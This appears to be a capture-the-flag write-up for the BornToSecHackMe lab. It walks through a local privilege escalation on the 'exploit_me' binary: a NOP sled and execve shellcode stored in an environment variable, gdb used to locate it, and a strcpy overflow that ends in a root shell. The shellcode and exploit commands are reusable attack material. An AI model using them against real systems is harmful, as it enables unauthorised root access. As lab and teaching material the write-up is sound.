## Buffer Overflow

Repeat steps of the **writeup1** until you are log on zaz's ssh session.

We already know that the binary `exploit_me` is vulnerable to **buffer overflow** but 
this time we're going to use a variant of the `ret2libc` by using an **environment variable**
and a **payload**.

We store the **payload** in an **environment variable**:
```bash
zaz@BornToSecHackMe:~$ export SHELL_CODE=$(python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
```

Now, we have to find the address of `SHELL_CODE`.

We launch **gdb** and disassemble main to choose a random **breakpoint**:
```bash
zaz@BornToSecHackMe:~$ gdb exploit_me

...

(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp # like this one
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
```

We create the **breakpoint** and run the program:
```bash
(gdb) break *0x080483f4
Breakpoint 1 at 0x80483f4

(gdb) r
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f4 in main ()
```

We search for the address of the **environement variable**:
```bash
(gdb) p (char *) getenv("SHELL_CODE")
$5 = 0xbffffec4 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
```

This time, our payload has to be as following:
```text
[buffer][SHELL_CODE address]
```

```bash
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("A"* 140 + "\xbf\xff\xfe\xc4"[::-1])'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
```
```bash
$ whoami
root
```





